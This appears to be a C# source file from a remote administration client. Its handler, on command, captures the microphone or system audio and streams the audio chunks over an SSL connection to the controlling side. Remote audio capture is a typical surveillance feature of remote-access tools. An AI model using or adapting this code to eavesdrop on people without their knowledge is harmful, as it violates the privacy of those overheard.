using System;
using System.Linq;
using System.Net.Security;
using System.Threading;
using System.Threading.Tasks;
using NAudio.CoreAudioApi;
using NAudio.Wave;
using RemoteAdmin.Shared;

namespace RemoteAdmin.Client.Handlers
{
    internal class AudioStreamHandler
    {
        private static WaveInEvent _microphoneCapture;
        private static WasapiLoopbackCapture _systemAudioCapture;
        private static SslStream _stream;
        private static bool _isMicStreaming;
        private static bool _isSystemAudioStreaming;
        private static long _micSequenceNumber;
        private static long _systemSequenceNumber;

        public static async Task HandleStartAudioStream(SslStream stream, StartAudioStreamMessage msg)
        {
            if (msg.SourceType == AudioSourceType.Microphone)
            {
                await StartMicrophoneStreaming(stream, msg.SampleRate, msg.Channels);
            }
            else if (msg.SourceType == AudioSourceType.SystemAudio)
            {
                await StartSystemAudioStreaming(stream);
            }
        }

        private static async Task StartMicrophoneStreaming(SslStream stream, int sampleRate, int channels)
        {
            if (_isMicStreaming)
                return;

            _stream = stream;
            _micSequenceNumber = 0;

            try
            {
                _microphoneCapture = new WaveInEvent
                {
                    WaveFormat = new WaveFormat(sampleRate, channels),
                    BufferMilliseconds = 100
                };

                _microphoneCapture.DataAvailable += async (sender, args) =>
                {
                    if (!_isMicStreaming)
                        return;

                    try
                    {
                        var audioMessage = new AudioChunkMessage
                        {
                            AudioData = args.Buffer.Take(args.BytesRecorded).ToArray(),
                            SourceType = AudioSourceType.Microphone,
                            SampleRate = sampleRate,
                            Channels = channels,
                            BitsPerSample = 16,
                            SequenceNumber = Interlocked.Increment(ref _micSequenceNumber)
                        };

                        await NetworkHelper.SendMessageAsync(_stream, audioMessage);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"Error sending microphone data: {ex.Message}");
                    }
                };

                _microphoneCapture.StartRecording();
                _isMicStreaming = true;

                Console.WriteLine("Started microphone streaming");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error starting microphone: {ex.Message}");
                await NetworkHelper.SendMessageAsync(stream, new OperationResultMessage
                {
                    Success = false,
                    Message = $"Failed to start microphone: {ex.Message}"
                });
            }
        }

        private static async Task StartSystemAudioStreaming(SslStream stream)
        {
            if (_isSystemAudioStreaming)
                return;

            _stream = stream;
            _systemSequenceNumber = 0;

            try
            {
                _systemAudioCapture = new WasapiLoopbackCapture();

                _systemAudioCapture.DataAvailable += async (sender, args) =>
                {
                    if (!_isSystemAudioStreaming)
                        return;

                    try
                    {
                        var audioMessage = new AudioChunkMessage
                        {
                            AudioData = args.Buffer.Take(args.BytesRecorded).ToArray(),
                            SourceType = AudioSourceType.SystemAudio,
                            SampleRate = _systemAudioCapture.WaveFormat.SampleRate,
                            Channels = _systemAudioCapture.WaveFormat.Channels,
                            BitsPerSample = _systemAudioCapture.WaveFormat.BitsPerSample,
                            SequenceNumber = Interlocked.Increment(ref _systemSequenceNumber)
                        };

                        await NetworkHelper.SendMessageAsync(_stream, audioMessage);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"Error sending system audio data: {ex.Message}");
                    }
                };

                _systemAudioCapture.StartRecording();
                _isSystemAudioStreaming = true;

                Console.WriteLine("Started system audio streaming");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error starting system audio capture: {ex.Message}");
                await NetworkHelper.SendMessageAsync(stream, new OperationResultMessage
                {
                    Success = false,
                    Message = $"Failed to start system audio: {ex.Message}"
                });
            }
        }

        public static void HandleStopAudioStream(StopAudioStreamMessage msg)
        {
            if (msg.SourceType == AudioSourceType.Microphone)
            {
                StopMicrophoneStreaming();
            }
            else if (msg.SourceType == AudioSourceType.SystemAudio)
            {
                StopSystemAudioStreaming();
            }
        }

        private static void StopMicrophoneStreaming()
        {
            _isMicStreaming = false;

            if (_microphoneCapture != null)
            {
                _microphoneCapture.StopRecording();
                _microphoneCapture.Dispose();
                _microphoneCapture = null;
            }

            Console.WriteLine("Stopped microphone streaming");
        }

        private static void StopSystemAudioStreaming()
        {
            _isSystemAudioStreaming = false;

            if (_systemAudioCapture != null)
            {
                _systemAudioCapture.StopRecording();
                _systemAudioCapture.Dispose();
                _systemAudioCapture = null;
            }

            Console.WriteLine("Stopped system audio streaming");
        }
    }
}
